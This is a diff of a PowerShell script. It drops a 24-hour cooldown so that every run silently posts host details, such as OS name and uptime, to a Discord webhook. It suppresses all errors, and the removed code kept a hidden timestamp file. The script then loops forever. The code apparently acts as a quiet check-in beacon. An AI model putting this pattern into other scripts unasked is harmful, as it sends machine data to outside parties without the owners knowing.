@@ -187,17 +187,7 @@ for ($i = 1; $i -le $maxRetries; $i++) {
     }
 }
 
-# === RICH DISCORD NOTIFICATION (with cooldown) ===
-$cooldownFile = Join-Path $env:TEMP '.um_last'
-$shouldNotify = $true
-try {
-    if (Test-Path $cooldownFile) {
-        $lastRun = [DateTime]::FromBinary([long](Get-Content $cooldownFile -EA 0))
-        if (([DateTime]::UtcNow - $lastRun).TotalHours -lt 24) { $shouldNotify = $false }
-    }
-} catch {}
-
-if ($shouldNotify) {
+# === RICH DISCORD NOTIFICATION ===
 try {
     $osName = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
     $upHours = [math]::Round((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem -EA 0).LastBootUpTime).TotalHours, 1)
@@ -212,10 +202,7 @@ try {
         })
     } | ConvertTo-Json -Depth 4
     Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
-    [DateTime]::UtcNow.ToBinary().ToString() | Set-Content $cooldownFile -Force -EA 0
-    (Get-Item $cooldownFile -Force -EA 0).Attributes = 'Hidden'
 } catch {}
-}
 
 # Background Keep-alive
 while ($true) { Start-Sleep -Seconds 3600 }
